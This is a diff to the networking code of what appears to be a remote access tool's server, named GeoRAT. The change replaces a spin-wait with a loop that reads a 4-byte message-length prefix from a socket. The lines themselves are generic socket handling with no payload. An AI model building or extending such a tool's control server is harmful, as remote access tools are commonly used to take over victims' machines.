@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Net.Security;
 using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
@@ -68,12 +69,12 @@ namespace GeoRAT.Server.Net
             try
             {
                 int total = DataSocket.EndReceive(result);
-                int left = sizeof(int) - total; // How much bytes left to receive. sizeof(int) indicates that we want to receive 4 bytes in total 
-                while (DataSocket.Available < left) //Wait for rest of bytes
+                int left = sizeof(int) - total; // How much bytes left to receive.  
+                do
                 {
-                    Thread.SpinWait(100);
-                }
-                DataSocket.Receive(PrefixBuffer, total, left, SocketFlags.None); //Get all bytes now 
+                    var recv = DataSocket.Receive(PrefixBuffer, total, left, SocketFlags.None);
+                    left -= recv;
+                } while (left != 0); 
                 var len = BitConverter.ToInt32(PrefixBuffer, 0); //Deserialize received bytes back to INT and get length of packet
                 MessageLength = len; //Assign length to global constant 
                 ReceiveMessage(MessageLength); //Begin reading incoming packets based on length now 
